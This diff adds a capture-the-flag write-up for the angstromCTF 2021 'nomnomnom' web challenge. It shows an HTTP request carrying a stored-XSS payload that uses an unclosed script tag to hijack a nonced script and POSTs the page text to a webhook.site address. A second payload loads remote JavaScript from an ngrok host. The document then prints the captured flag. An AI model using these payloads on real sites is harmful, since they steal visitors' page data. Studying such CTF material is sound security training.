@@ -1,0 +1,63 @@
+======================= Payload 1 =======================
+
+POST /record HTTP/1.1
+Host: nomnomnom.2021.chall.actf.co
+Connection: close
+Content-Length: 22
+sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: https://nomnomnom.2021.chall.actf.co
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://nomnomnom.2021.chall.actf.co/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+
+{"name":"<script src=\"data:text/javascript, fetch('https://webhook.site/c7c327b2-81ef-4267-880f-be92a5b57387', {method: 'POST', mode: 'no-cors', body: document.body.innerText})\"","score": 32}
+
+
+Found. Redirecting to /shares/c5abe364fb8ac84c
+
+
+Open with Firefox
+
+Unfinished script tags ate (haha! nom’d) the script tag that was below it. => XSS
+```
+This score was set by <script src="data:text/javascript, fetch('https://webhook.site/c7c327b2-81ef-4267-880f-be92a5b57387', {method: 'POST', mode: 'no-cors', body: document.body.innerText})"
+<script nonce='3342290aa95788c379b8c0508a13f808'>
+```
+
+But report button is broken
+
+Open console and execute
+```
+> function report() {
+	fetch('/report/3f20701835e3c173', {
+		method: 'POST'
+	})
+  }
+> report()
+
+
+Get flag
+```
+deletion token: actf{w0ah_the_t4g_n0mm3d_th1ng5}
+
+
+snek goes nomnomnom
+
+Check out this score of 2!
+Play! Report.
+
+This score was set by
+```
+
+
+======================= Payload 2 =======================
+
+<script src="http://a288a166e070.ngrok.io/app.js"
+
